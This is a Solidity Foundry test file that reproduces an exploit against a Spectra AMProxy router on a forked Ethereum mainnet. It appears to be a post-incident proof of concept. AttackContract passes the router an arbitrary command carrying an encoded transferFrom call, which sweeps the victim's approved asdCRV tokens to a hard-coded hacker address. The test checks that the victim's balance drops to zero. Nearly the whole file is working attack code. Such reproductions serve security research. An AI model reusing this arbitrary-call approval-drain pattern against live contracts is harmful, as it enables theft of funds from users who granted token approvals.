// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IRouter} from "../src/bug/interfaces/IRouter.sol";

contract AttackContract {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(
        address proxy,
        address token,
        address from,
        address receiver
    ) external {
        bytes memory _commands;
        _commands = hex"12";
        bytes[] memory _inputs = new bytes[](_commands.length);
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 approve_amount = IERC20(token).allowance(from, proxy);
        bytes memory transferFrom_calldata = abi.encodeCall(
            IERC20.transferFrom,
            (
                from,
                receiver,
                balance > approve_amount ? approve_amount : balance
            )
        );
        // address kyberRouter,
        // address tokenIn,
        // uint256 amountIn,
        // address tokenOut,
        // uint256,
        // bytes memory targetData
        _inputs[0] = abi.encode(
            token,
            ETH,
            0,
            address(0),
            0,
            transferFrom_calldata
        );
        // implementation: 0x51BdbfCd7656e2C25Ad1BC8037F70572B7142eCC
        IRouter(proxy).execute(_commands, _inputs);
    }
}

contract AttackSpectraAMProxy is Test {
    uint256 constant blockNumber = 20369956;
    address constant hacker = 0x53635bF7B92B9512F6De0eB7450b26d5d1AD9a4C;
    address constant sufferer = 0x279a7DBFaE376427FFac52fcb0883147D42165FF;
    address constant amProxy = 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    address constant asdCRV = 0x43E54C2E7b3e294De3A155785F52AB49d87B9922;

    function setUp() public {
        uint256 forkId = vm.createFork(
            vm.envString("ETH_RPC_URL"),
            blockNumber
        );
        vm.selectFork(forkId);
    }

    modifier hackerOnly() {
        vm.startPrank(hacker);
        _;
        vm.stopPrank();
    }

    function _attack() private hackerOnly {
        AttackContract attackContract = new AttackContract();
        attackContract.attack(amProxy, asdCRV, sufferer, hacker);
    }

    function testAttack() public {
        uint256 balance_before = IERC20(asdCRV).balanceOf(sufferer);
        console.log("attack before balance:", balance_before);
        assertGt(balance_before, 0);
        _attack();
        uint256 balance_after = IERC20(asdCRV).balanceOf(sufferer);
        console.log("attack after balance:", balance_after);
        assertEq(balance_after, 0);
    }
}

// forge test --match-contract AttackSpectraAMProxy -vvv
